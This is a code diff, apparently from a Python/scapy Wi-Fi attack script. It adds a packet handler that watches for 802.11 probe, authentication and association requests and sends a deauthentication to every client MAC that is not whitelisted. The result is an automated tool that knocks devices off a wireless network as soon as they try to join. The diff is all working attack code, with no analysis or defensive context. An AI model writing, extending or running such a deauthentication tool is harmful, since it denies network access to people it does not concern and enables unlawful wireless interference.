@@ -59,3 +59,25 @@ def deauth(mac, reason=""):
         print(f"[+] Deauthed {mac} on {BAND}GHz")
     except Exception as e:
         print(f"[!] Deauth failed for {mac}: {str(e)}")
+
+def packet_handler(pkt):
+    """Enhanced client detection with packet type analysis"""
+    if pkt.haslayer(Dot11):
+        # Detect various packet types
+        if pkt.haslayer(Dot11ProbeReq):
+            src = pkt.addr2
+            if src and src != bssid and src not in whitelist:
+                active_clients.add(src)
+                deauth(src, "ProbeReq")
+        
+        elif pkt.haslayer(Dot11Auth):
+            src = pkt.addr2
+            if src and src != bssid and src not in whitelist:
+                active_clients.add(src)
+                deauth(src, "Auth")
+        
+        elif pkt.haslayer(Dot11AssoReq):
+            src = pkt.addr2
+            if src and src != bssid and src not in whitelist:
+                active_clients.add(src)
+                deauth(src, "AssoReq")
